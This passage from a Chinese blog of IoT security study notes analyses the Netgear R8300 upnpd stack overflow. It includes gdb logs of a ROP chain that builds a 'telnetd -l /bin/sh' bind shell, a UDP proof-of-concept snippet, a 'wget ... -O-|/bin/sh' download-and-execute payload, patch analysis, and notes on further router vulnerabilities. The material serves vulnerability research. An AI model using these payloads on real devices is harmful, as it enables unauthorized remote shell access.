class="line">      0x13648                  mov    r1,  r5</span><br><span class="line"> →    0x1364c                  bl     0xb2ec &lt;strcpy@plt&gt;</span><br><span class="line"> </span><br><span class="line">0x0001364c <span class="keyword">in</span> ?? ()</span><br><span class="line"><span class="comment"># 5 注意，当lr=pc时，ni会跑飞，在下条指令下断可避免（为何这样就会跑飞，原理未知</span></span><br><span class="line"><span class="variable">$lr</span>  : 0x00013650  →   mov r0,  r4</span><br><span class="line"><span class="variable">$pc</span>  : 0x00013650  →   mov r0,  r4</span><br><span class="line"></span><br><span class="line">      0x13644                  mov    r0,  r10</span><br><span class="line">      0x13648                  mov    r1,  r5</span><br><span class="line">      0x1364c                  bl     0xb2ec &lt;strcpy@plt&gt;</span><br><span class="line"> →    0x13650                  mov    r0,  r4</span><br><span class="line">      0x13654                  add    sp,  sp,  <span class="comment">#92	; 0x5c</span></span><br><span class="line">      0x13658                  pop    &#123;r4,  r5,  r6,  r7,  r8,  r10,  pc&#125;</span><br><span class="line">      </span><br><span class="line">0x00013650 <span class="keyword">in</span> ?? ()</span><br><span class="line">gef➤  b *0x13654</span><br><span class="line">Breakpoint 2 at 0x13654</span><br><span class="line">gef➤  ni</span><br><span class="line"><span class="comment"># 6 同上，继续通过pop控制pc，此次为0x13648，光修改src，dst还是之前bss中的0x9e150</span></span><br><span class="line"><span class="variable">$pc</span>  : 0x00013658  →   pop &#123;r4,  r5,  r6,  r7,  r8,  r10,  pc&#125;</span><br><span class="line"></span><br><span class="line">      0x1364c                  bl     0xb2ec &lt;strcpy@plt&gt;</span><br><span class="line">      0x13650                  mov    r0,  r4</span><br><span class="line">      0x13654                  add    sp,  sp,  <span class="comment">#92	; 0x5c</span></span><br><span class="line"> →    0x13658                  pop    &#123;r4,  r5,  r6,  r7,  r8,  r10,  pc&#125;</span><br><span class="line">   ↳     0x13648                  mov    r1,  r5</span><br><span class="line">         0x1364c                  bl     0xb2ec &lt;strcpy@plt&gt;</span><br><span class="line">         0x13650                  mov    r0,  r4</span><br><span class="line">         0x13654                  add    sp,  sp,  <span class="comment">#92	; 0x5c</span></span><br><span class="line">         0x13658                  pop    &#123;r4,  r5,  r6,  r7,  r8,  r10,  pc&#125;</span><br><span class="line">         </span><br><span class="line">0x00013658 <span class="keyword">in</span> ?? ()</span><br><span class="line"><span class="comment"># 7 pop+strcpy，循环多次，直至拼接出完整的命令字符串</span></span><br><span class="line">    <span class="comment"># 0x13648                  mov    r1,  r5</span></span><br><span class="line">    <span class="comment"># 0x1364c                  bl     0xb2ec &lt;strcpy@plt&gt;</span></span><br><span class="line">    <span class="comment"># 0x13650                  mov    r0,  r4</span></span><br><span class="line">    <span class="comment"># 0x13654                  add    sp,  sp,  #92	; 0x5c</span></span><br><span class="line">    <span class="comment"># 0x13658                  pop    &#123;r4,  r5,  r6,  r7,  r8,  r10,  pc&#125;</span></span><br><span class="line"><span class="comment"># 8 查看src，即bss中0x9e150，其存放strcpy拼接后的命令字符串（display命令可让其每次都显示</span></span><br><span class="line">gef➤  display/s 0x9e150</span><br><span class="line">5: x/s 0x9e150  0x9e150:	<span class="string">"telnetd -lan_mac"</span></span><br><span class="line"><span class="comment"># 9 节省时间，不用ni而c（要事先下断），看命令字符串的变化</span></span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">Breakpoint 2, 0x00013654 <span class="keyword">in</span> ?? ()</span><br><span class="line">5: x/s 0x9e150  0x9e150:	<span class="string">"telnetd -l   &lt;m:"</span></span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">Breakpoint 2, 0x00013654 <span class="keyword">in</span> ?? ()</span><br><span class="line">5: x/s 0x9e150  0x9e150:	<span class="string">"telnetd -l /bin/uptime &gt; /tmp/time_tmp"</span></span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">Breakpoint 2, 0x00013654 <span class="keyword">in</span> ?? ()</span><br><span class="line">5: x/s 0x9e150  0x9e150:	<span class="string">"telnetd -l /bin/sh"</span></span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">Breakpoint 2, 0x00013654 <span class="keyword">in</span> ?? ()</span><br><span class="line">5: x/s 0x9e150  0x9e150:	<span class="string">"telnetd -l /bin/sh -p %s -f %s -s /%s/%s/%s -d %s -h 1 &amp;"</span></span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">Breakpoint 2, 0x00013654 <span class="keyword">in</span> ?? ()</span><br><span class="line">5: x/s 0x9e150  0x9e150:	<span class="string">"telnetd -l /bin/sh -p 99"</span></span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">Breakpoint 2, 0x00013654 <span class="keyword">in</span> ?? ()</span><br><span class="line">5: x/s 0x9e150  0x9e150:	<span class="string">"telnetd -l /bin/sh -p 9999"</span></span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">Breakpoint 2, 0x00013654 <span class="keyword">in</span> ?? ()</span><br><span class="line">5: x/s 0x9e150  0x9e150:	<span class="string">"telnetd -l /bin/sh -p 9999 &amp; b"</span></span><br><span class="line">gef➤  ni</span><br><span class="line">0x00013650 <span class="keyword">in</span> ?? ()</span><br><span class="line">5: x/s 0x9e150  0x9e150:	<span class="string">"telnetd -l /bin/sh -p 9999 &amp; "</span></span><br><span class="line"><span class="comment"># 10 命令字符串拼接完成后，pop控制pc为0x1a83c，去执行system函数</span></span><br><span class="line"><span class="variable">$pc</span>  : 0x00013658  →   pop &#123;r4,  r5,  r6,  r7,  r8,  r10,  pc&#125;</span><br><span class="line"></span><br><span class="line">      0x1364c                  bl     0xb2ec &lt;strcpy@plt&gt;</span><br><span class="line">      0x13650                  mov    r0,  r4</span><br><span class="line">      0x13654                  add    sp,  sp,  <span class="comment">#92	; 0x5c</span></span><br><span class="line"> →    0x13658                  pop    &#123;r4,  r5,  r6,  r7,  r8,  r10,  pc&#125;</span><br><span class="line">   ↳     0x1a83c                  mov    r0,  r4</span><br><span class="line">         0x1a840                  bl     0xaaac &lt;system@plt&gt;</span><br><span class="line">0x00013658 <span class="keyword">in</span> ?? ()</span><br><span class="line"><span class="comment"># 11 执行system，此时r0即前面拼接好的命令字符串</span></span><br><span class="line"><span class="variable">$r0</span>  : 0x0009e150  →  <span class="string">"telnetd -l /bin/sh -p 9999 &amp; "</span></span><br><span class="line"><span class="variable">$pc</span>  : 0x0001a840  →   bl 0xaaac &lt;system@plt&gt;</span><br><span class="line"></span><br><span class="line">      0x1a83c                  mov    r0,  r4</span><br><span class="line"> →    0x1a840                  bl     0xaaac &lt;system@plt&gt;</span><br><span class="line"></span><br><span class="line">0x0001a840 <span class="keyword">in</span> ?? ()</span><br><span class="line"><span class="comment"># 12 放行，程序崩溃</span></span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line"><span class="comment"># 13 upnpd日志中出现system信息，而且ps后发现已启动，exp执行成功</span></span><br><span class="line">[0x0001a844] system(<span class="string">'telnetd -l /bin/sh -p 9999 &amp; '</span>) = 0<span class="comment"># 日志</span></span><br><span class="line">4237 0          1884 S   telnetd -l /bin/sh -p 9999 <span class="comment"># ps</span></span><br></pre></td></tr></table></figure>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul>
<li>bss段：C语言的全局变量如果在代码中没有初始化，就会在程序加载时用0初始化。这种数据属于.bss段，在加载时它和.data段一样都是可读可写的数据，但是在ELF文件中.data段需要 占用一部分空间保存初始值，而.bss 段则不需要。也就是说，.bss 段在文件中只占一个Section Header而没有对应的Section，程序加载时.bss段占多大内存空间在Section Header中描述</li>
<li>stack reuse为什么可行？<ul>
<li>局部变量的存储空间在每次函数调用时分配，在函数返回时释放</li>
<li>call_recvfrom函数中，通过recvfrom函数将接收的socket数据保存在call_recvfrom函数栈上的局部变量中，其没有初始化，故局部变量的值是不确定的，第一次send将expayload保存到局部变量中，此时会调用一次call_recvfrom函数，第二次send真正的payload，又会调用一次call_recvfrom函数，而“局部变量的存储空间在每次函数调用时分配，在函数返回时释放”，怎么来保证第二次send时，局部变量还保存着第一次send时的expayload？？？</li>
<li>//here</li>
</ul>
</li>
<li>exp效果</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exp成功，开启了telnet</span></span><br><span class="line">4116 0          1896 S   telnetd -l /bin/sh -p 9999</span><br><span class="line"><span class="comment"># 能连上，但很快断，应该是模拟的问题</span></span><br><span class="line">lxl@ubuntu:~/Desktop/8/squashfs-root$ telnet 192.168.1.2 9999</span><br><span class="line">Trying 192.168.1.2...</span><br><span class="line">Connected to 192.168.1.2.</span><br><span class="line">Escape character is <span class="string">'^]'</span>.</span><br><span class="line">Connection closed by foreign host.</span><br></pre></td></tr></table></figure>
<ul>
<li>rop chain的构造，勉强能看懂，自己实践有点难，多积累//here</li>
</ul>
<h2 id="fenix"><a href="#fenix" class="headerlink" title="fenix"></a>fenix</h2><p><a href="https://paper.seebug.org/1311/#8" target="_blank" rel="noopener">https://paper.seebug.org/1311/#8</a></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">显然，R4 - R11 也是可控的，思考一下目前的情况：</span><br><span class="line">    1. 开了 NX 不能用 shellcode。</span><br><span class="line">    2. 有 ASLR，不能泄漏地址，不能使用各种 LIB 库中的符号和 gadget。</span><br><span class="line">    3. strcpy() 函数导致的溢出，payload 中不能包含 \x00 字符。</span><br><span class="line"></span><br><span class="line">其实可控 PC 后已经可以干很多事了，upnpd 内包含大量 system 函数调用，比如 reboot。</span><br><span class="line"></span><br><span class="line">下面探讨下更为 general 的 RCE 利用，一般像这种 ROP 的 payload 中包含 \x00，覆盖返回地址的payload 又不能包含 \x00，就要想办法提前将 ROP payload 注入目标内存。</span><br><span class="line"></span><br><span class="line">比如，利用内存未初始化问题，构造如下 PoC，每个 payload 前添加 \x00 防止程序崩溃。</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">s.connect((<span class="string">'192.168.2.2'</span>, 1900))</span><br><span class="line">s.send(b<span class="string">'\x00'</span> + b<span class="string">'A'</span> * 0x1ff0)</span><br><span class="line">s.send(b<span class="string">'\x00'</span> + b<span class="string">'B'</span> * 0x633)</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line">在漏洞点下断点，</span><br><span class="line">两次拷贝完成后，看下内存布局：</span><br><span class="line">可以看到，由于接收 socket 数据的 buffer 未初始化，在劫持 PC 前我们可以往目标内存注入 6500 多字节的数据。 这么大的空间，也足以给 ROP 的 payload 一片容身之地。</span><br><span class="line"></span><br><span class="line">关于 ROP，使用 strcpy 调用在 bss 上拼接出命令字符串，并调整 R0 指向这段内存，然后跳转 system 执行即可。</span><br><span class="line"></span><br><span class="line">原作者构造的 system(<span class="string">"telnetd -l /bin/sh -p 9999&amp; "</span>) 绑定型 shell。</span><br><span class="line"></span><br><span class="line">经过分析，我发现可以构造 system(<span class="string">"wget http://&#123;reverse_ip&#125;:&#123;reverse_port&#125; -O-|/bin/sh"</span>) 调用，从而无限制任意命令执行。</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绑定型shell：telnetd -l /bin/sh -p 9999&amp;</span></span><br><span class="line"><span class="comment"># 无限制任意命令执行：wget http://&#123;reverse_ip&#125;:&#123;reverse_port&#125; -O-|/bin/sh，怎么用？</span></span><br><span class="line">mac下：</span><br><span class="line">lxl@192  ~/Desktop  nc -lvn 4444</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">User-Agent: Wget/1.19.4 (linux-gnu)</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">Host: 192.168.142.1:4444</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line"></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line"></span><br><span class="line">Ubuntu下：</span><br><span class="line">lxl@ubuntu:~/Desktop/8$ wget http://192.168.142.1:4444 -O-|/bin/sh</span><br><span class="line">--2020-11-20 16:37:57--  http://192.168.142.1:4444/</span><br><span class="line">Connecting to 192.168.142.1:4444... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 No headers, assuming HTTP/0.9</span><br><span class="line">Length: unspecified</span><br><span class="line">Saving to: ‘STDOUT’</span><br><span class="line"></span><br><span class="line">-  [&lt;=&gt;                    ]       0  --.-KB/s               /home/lxl/Desktop/8</span><br><span class="line"><span class="comment"># 一直在等，不知道怎么用，怎么个无限制法，与telnet相比有何优势？//here</span></span><br></pre></td></tr></table></figure>
<h2 id="cq"><a href="#cq" class="headerlink" title="cq"></a>cq</h2><p><a href="https://cq674350529.github.io/2020/09/16/PSV-2020-0211-Netgear-R8300-UPnP栈溢出漏洞分析/" target="_blank" rel="noopener">https://cq674350529.github.io/2020/09/16/PSV-2020-0211-Netgear-R8300-UPnP栈溢出漏洞分析/</a></p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-11-23-004937.jpg" alt="image-20201120170623224"></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">upnpd程序启用的缓解措施如下，可以看到仅启用了NX机制。另外，由于程序的加载基址为0x8000，故.text段地址的最高字节均为\x00，而在调用strcpy()时存在NULL字符截断的问题，因此在进行漏洞利用时需要想办法绕过NULL字符限制的问题。</span><br><span class="line"> checksec --file ./upnpd</span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8000)</span><br><span class="line">    </span><br><span class="line">SSD公开的漏洞细节中给出了一个方案：通过stack reuse的方式来绕过该限制。具体思路为，先通过socket发送第一次数据，往栈上填充相应的rop payload，同时保证不会造成程序崩溃；再通过socket发送第二次数据用于覆盖栈上的返回地址，填充的返回地址用来实现stack pivot，即劫持栈指针使其指向第一次发送的payload处，然后再复用之前的payload以完成漏洞利用。SSD公开的漏洞细节中的示意图如下。</span><br><span class="line"></span><br><span class="line">实际上，由于recvfrom()函数与漏洞点strcpy()之间的路径比较短，栈上的数据不会发生太大变化，利用stack reuse的思路，只需发送一次数据即可完成利用，示意图如下。在调用ssdp_http_method_check()前，接收的socket数据包保存在upnp_main()函数内的局部缓冲区上，而在ssdp_http_method_check()内，当调用完strcpy()后，会复制一部分数据到该函数内的局部缓冲区上。通过覆盖栈上的返回地址，可劫持栈指针，使其指向upnp_main()函数内的局部缓冲区，复用填充的rop gadgets，从而完成漏洞利用。</span><br><span class="line"></span><br><span class="line">另外在调用strcpy()后，在(4)处还调用了函数sub_B60C()。通过对应的汇编代码可知，在覆盖栈上的返回地址之前，也会覆盖R7指向的栈空间内容，之后R7作为参数传递给sub_B60C()。而在sub_B60C()中，会读取R0指向的栈空间中的内容，然后再将其作为参数传递给strstr()，这意味[R0]中的值必须为一个有效的地址。因此在覆盖返回地址的同时，还需要用一个有效的地址来填充对应的栈偏移处，保证函数在返回前不会出现崩溃。由于libc库对应的加载基址比较大，即其最高字节不为\x00，因此任意选取该范围内的一个不包含\x00的有效地址即可。</span><br><span class="line"></span><br><span class="line">在解决了NULL字符截断的问题之后，剩下的部分就是寻找rop gadgets来完成漏洞利用了，相对比较简单。同样，SSD公开的漏洞细节中也包含了完整的漏洞利用代码，其思路是通过调用strcpy gadget拼接出待执行的命令，并将其写到某个bss地址处，然后再调用system gadget执行对应的命令。</span><br><span class="line"></span><br><span class="line">在给出的漏洞利用代码中，strcpy gadget执行的过程相对比较繁琐，经过分析后，在upnpd程序中找到了另一个更优雅的strcpy gadget，如下。借助该gadget，可以直接在数据包中发送待执行的命令，而无需进行命令拼接。</span><br><span class="line"></span><br><span class="line">.text:0000B764 MOV             R0, R4  ; dest</span><br><span class="line">.text:0000B768 MOV             R1, SP  ; src</span><br><span class="line">.text:0000B76C BL              strcpy</span><br><span class="line">.text:0000B770 ADD             SP, SP, <span class="comment">#0x400</span></span><br><span class="line">.text:0000B774 LDMFD           SP!, &#123;R4-R6,PC&#125;</span><br></pre></td></tr></table></figure>
<h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>fenix</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">signed int __fastcall sub_25B88(const char *a1, int a2, int a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v40; // [sp+24h] [bp-Ch]</span><br><span class="line">  int s; // [sp+600h] [bp+5D0h]</span><br><span class="line">  int *v51; // [sp+628h] [bp+5F8h]</span><br><span class="line"></span><br><span class="line">  v3 = a1;</span><br><span class="line">  memset(&amp;v40, 0, 0x5DCu);</span><br><span class="line">  v51 = &amp;v40;</span><br><span class="line">  strncpy((char *)&amp;v40, v3, 0x5DBu);</span><br><span class="line"></span><br><span class="line">在更新版固件 V1.0.2.134 中，用 strncpy() 代替 strcpy()，限制了拷贝长度为 0x5db，正好是 buffer 长度减 1。</span><br><span class="line"></span><br><span class="line">补丁中还特意用 memset() 初始化了 buffer。</span><br><span class="line">	这是由于 strncpy() 在拷贝时，如果 n &lt; src 的长度，只是将 src 的前 n 个字符复制到 dest 的前 n 个字符，不会自动添加 \x00，也就是结果 dest 不包括 \x00，需要再手动添加一个 \x00；</span><br><span class="line">	如果 src 的长度小于 n 个字节，则以\x00 填充 dest 直到复制完 n 个字节。</span><br><span class="line"></span><br><span class="line">结合上面的 RCE 利用过程，可见申请内存之后及时初始化是个很好的编码习惯，也能一定程度上避免很多安全问题。</span><br><span class="line"><span class="comment"># v40大小为0x5DC，memset时全部设为0</span></span><br><span class="line"><span class="comment"># strncpy时，限定大小为0x5DB，若src&gt;n，则会占满前0x5DB个位置，其不会自动添加0，但是前面memset时提前设为0了，所以就算src&gt;n,总是能保证最后一个是00</span></span><br></pre></td></tr></table></figure>
<h2 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h2><ul>
<li><p>注意</p>
<ul>
<li>scp向qemu虚拟机传输squashfs-root时，一定要打包打包打包，万无一失</li>
<li>/usr/sbin/upnpd执行后没有任何反应，没有报错信息没发定位，用sh脚本调试失败，换qemu-arm-static，用–strace选项</li>
</ul>
</li>
<li><p>gdb安装gef插件（可高亮</p>
</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">"<span class="variable">$(wget http://gef.blah.cat/sh -O -)</span>"</span></span><br><span class="line">cat ~/.gdbinit</span><br><span class="line">	<span class="built_in">source</span> /home/lxl/.gdbinit-gef.py</span><br></pre></td></tr></table></figure>
<ul>
<li><a href="https://cq674350529.github.io/2020/09/16/PSV-2020-0211-Netgear-R8300-UPnP栈溢出漏洞分析/，函数名是怎么识别出来的ssdp_http_method_check()" target="_blank" rel="noopener">https://cq674350529.github.io/2020/09/16/PSV-2020-0211-Netgear-R8300-UPnP栈溢出漏洞分析/，函数名是怎么识别出来的ssdp_http_method_check()</a></li>
<li>怎么获取有效地址，不会变的？（用libc中的system函数地址，其他也行</li>
<li>lr=pc时，ni跑飞</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ni跑飞了，是不是因为$lr=$pc？（exp成功了，所以是跑飞了</span></span><br><span class="line"><span class="comment"># 看到lr和pc相同时，就不要直接ni了，先在下条指令下断，再ni，避免跑飞（具体原理未知</span></span><br><span class="line"><span class="variable">$lr</span>  : 0x00013650  →   mov r0,  r4</span><br><span class="line"><span class="variable">$pc</span>  : 0x00013650  →   mov r0,  r4</span><br><span class="line"> →    0x13650                  mov    r0,  r4</span><br><span class="line">      0x13654                  add    sp,  sp,  <span class="comment">#92	; 0x5c</span></span><br><span class="line">gef➤  b *0x13654</span><br><span class="line">Breakpoint 2 at 0x13654</span><br><span class="line">gef➤  ni</span><br></pre></td></tr></table></figure>
<ul>
<li><p>有 ASLR，不能泄漏地址，不能使用各种 LIB 库中的符号和 gadget</p>
<p>  其实可控 PC 后已经可以干很多事了，<code>upnpd</code> 内包含大量 <code>system</code> 函数调用，比如 <code>reboot</code></p>
<p>  ？？？</p>
<p>  开了aslr，则加载lib时，其基址会变，因此不可用，但是二进制本身的system可用，其本身加载基址不变吗，为什么ida中搜到的bl system地址，就可用，地址不会变吗？</p>
<p>  （物理地址与虚拟地址</p>
<p>  （NX与ASLR</p>
<p>  //here</p>
</li>
<li><p>无限制任意命令执行：wget http://{reverse_ip}:{reverse_port} -O-|/bin/sh，怎么用？//here</p>
</li>
<li><p>stack reuse为什么可行？//here</p>
<ul>
<li>局部变量的存储空间在每次函数调用时分配，在函数返回时释放</li>
<li>call_recvfrom函数中，通过recvfrom函数将接收的socket数据保存在call_recvfrom函数栈上的局部变量中，其没有初始化，故局部变量的值是不确定的，第一次send将expayload保存到局部变量中，此时会调用一次call_recvfrom函数，第二次send真正的payload，又会调用一次call_recvfrom函数，而“局部变量的存储空间在每次函数调用时分配，在函数返回时释放”，怎么来保证第二次send时，局部变量还保存着第一次send时的expayload？？？</li>
</ul>
</li>
</ul>
<blockquote>
<p> 参考</p>
<ul>
<li><a href="https://paper.seebug.org/1311/#8" target="_blank" rel="noopener">https://paper.seebug.org/1311/#8</a></li>
<li><a href="https://kb.netgear.com/000062158/Security-Advisory-for-Pre-Authentication-Command-Injection-on-R8300-PSV-2020-0211" target="_blank" rel="noopener">https://kb.netgear.com/000062158/Security-Advisory-for-Pre-Authentication-Command-Injection-on-R8300-PSV-2020-0211</a></li>
<li><a href="https://ssd-disclosure.com/#what-we-do" target="_blank" rel="noopener">https://ssd-disclosure.com/#what-we-do</a></li>
</ul>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://21guns.top/2021/06/21/iot/IOT安全-文章学习笔记-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="21Guns">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="have a nice day">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/06/21/iot/IOT安全-文章学习笔记-2/" class="post-title-link" itemprop="url">IOT安全-文章学习笔记-2</a>
        </h2>

        <div class="post-meta">

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-06-21 09:23:44" itemprop="dateCreated datePublished" datetime="2021-06-21T09:23:44+08:00">2021-06-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-21 16:00:09" itemprop="dateModified" datetime="2022-02-21T16:00:09+08:00">2022-02-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/IOT安全/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>[TOC]</p>
<h1 id="IOT安全-文章学习笔记-2"><a href="#IOT安全-文章学习笔记-2" class="headerlink" title="IOT安全-文章学习笔记-2"></a>IOT安全-文章学习笔记-2</h1><h2 id="CVE-20220090（华硕DSL-AC3100）身份验证绕过漏洞分析"><a href="#CVE-20220090（华硕DSL-AC3100）身份验证绕过漏洞分析" class="headerlink" title="CVE-20220090（华硕DSL-AC3100）身份验证绕过漏洞分析"></a>CVE-20220090（华硕DSL-AC3100）身份验证绕过漏洞分析</h2><p><a href="https://www.anquanke.com/post/id/250724" target="_blank" rel="noopener">https://www.anquanke.com/post/id/250724</a></p>
<ul>
<li>概要：静态资源路径的认证绕过、解密获取token、ping功能注入（猜的）、telnetd开关的配置项</li>
<li>用.w 为后缀的固件文件</li>
<li>由于漏洞是身份认证绕过漏洞，因此首先要确定设备的身份验证相关的函数有哪些</li>
<li>三种情况：0-验证通过、超时重新认证、2-新用户故需要认证</li>
<li>逻辑运算符&amp;&amp; 的优先级大于 ||</li>
<li>逻辑或，前面条件为真，则不看后者，即可以跳过evaluate_access</li>
<li>仅认证绕过还不够，还需httoken，httoken 是设备的token值，在服务端进行生成，然后前端js 中进行解密，最终向服务器请求的时候，将httoken加入到请求数据中</li>
<li>很多的网络设备中在ping网络诊断 这个功能中，出现过大量的历史漏洞</li>
<li>/sbin/arc_telnetd 文件中：获取ARC_TELNETD_ENABLE的值，当值为1的时候，设备会开启telnetd</li>
<li>通过前端静态资源的路径，来绕过身份验证</li>
</ul>
<h2 id="NetGear-夜鹰-RAX40V2-设备与固件分析"><a href="#NetGear-夜鹰-RAX40V2-设备与固件分析" class="headerlink" title="NetGear 夜鹰 RAX40V2 设备与固件分析"></a>NetGear 夜鹰 RAX40V2 设备与固件分析</h2><p><a href="https://www.anquanke.com/post/id/248900" target="_blank" rel="noopener">https://www.anquanke.com/post/id/248900</a></p>
<ul>
<li>概要：通过uart进入shell、开启telnet/修改密码获取网络层shell（uart是硬件层）、从设备中提取出文件系统、ubi提取固件</li>
<li>NetGear路由器：自带UART接口且已标明、波特率一般为115200</li>
<li>识别usb：ls -ll /dev/tty</li>
<li>识别波特率：devttys0 的小工具baudrate.py</li>
<li>minicom保存串口log 为文件（未说明，自行搜索）</li>
<li>弱口令进入uart的shell，但命令受限，类似这种低权限的shell，输入sh、\bin\sh、bash等命令可能会获取完整版的shell</li>
<li>telnet常见可执行文件：telnetd、utelnetd（之前还遇到过dropbear）</li>
<li>telnetd与UART，二者shell的用户名/密码可能不同</li>
<li>直接更改admin 用户的密码为空，原来：<code>admin:x:0:0:admin:/:/bin/sh</code>，改后<code>admin::0:0:admin:/:/bin/sh</code>（直接留空）</li>
<li>提取fs：cat /proc/mtd，可见mtd11对应rootfs-ubifs，可直接dd提取，dd if=/dev/mtd11 of=/tmp/rootfs_ubifs.bin（只if/of无需其它参数）</li>
<li>提取nvram，nvram show &gt; nvram.bin</li>
<li>解开ubi 文件有两种方法：挂载、使用 ubi_reader 套件</li>
</ul>
<h2 id="CVE-2020-26567-DSR-250N-远程拒绝服务漏洞分析"><a href="#CVE-2020-26567-DSR-250N-远程拒绝服务漏洞分析" class="headerlink" title="CVE-2020-26567 DSR-250N 远程拒绝服务漏洞分析"></a>CVE-2020-26567 DSR-250N 远程拒绝服务漏洞分析</h2><p><a href="https://www.anquanke.com/post/id/247049" target="_blank" rel="noopener">https://www.anquanke.com/post/id/247049</a></p>
<ul>
<li>概要：手动提取squashfs、cgi中有reboot导致拒绝服务、httpd与cgi、cgi如何触发及未授权访问???</li>
<li>手动提取squashfs<ul>
